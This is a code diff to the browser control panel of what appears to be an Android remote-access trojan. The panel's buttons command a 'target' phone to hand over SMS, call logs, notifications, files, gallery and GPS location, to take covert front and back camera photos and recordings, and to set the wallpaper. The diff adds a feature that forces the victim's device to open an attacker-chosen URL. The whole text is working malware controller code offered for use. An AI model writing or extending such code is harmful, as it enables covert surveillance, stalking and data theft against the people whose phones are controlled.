@@ -79,6 +79,13 @@
             document.getElementById('modal').style.display = 'flex';
             document.getElementById('modal-title').innerText = t.toUpperCase();
             
+            if(t === 'open_url') {
+                document.getElementById('modal-body').innerHTML = `<p style="margin-bottom:10px; color:var(--dim)">Target Link (Website/DeepLink):</p>
+                               <input id="ourl" placeholder="https://example.com" value="https://google.com" style="padding:15px; font-size:1.1rem; border-color:var(--primary)">`;
+                document.getElementById('modal-footer').innerHTML = `<button style="width:100%; padding:15px;" onclick="cmd('openurl '+document.getElementById('ourl').value)">🚀 OPEN ON TARGET</button>`;
+                return;
+            }
+
             const map = { sms:'getsms', calls:'getcalllogs', filemanager:'filemanager', gallery:'gallery', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic' };
             if(map[t]) cmd(map[t]);
             render();
@@ -165,7 +172,6 @@
                 const data = await res.json();
                 if(data.status === 'ok') {
                     status.innerText = "Upload Success! Applying...";
-                    // Use window.location.origin to get the base URL of the server
                     const wallUrl = window.location.origin + '/captured_images/' + data.filename;
                     cmd('set_wallpaper ' + wallUrl);
                 } else status.innerText = "Upload Failed.";
@@ -200,7 +206,8 @@
                 {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
                 {id:'record_back', i:'fa-circle-dot', l:'REC BACK'}, {id:'record_front', i:'fa-record-vinyl', l:'REC FRONT'},
-                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'}
+                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
+                {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
         }
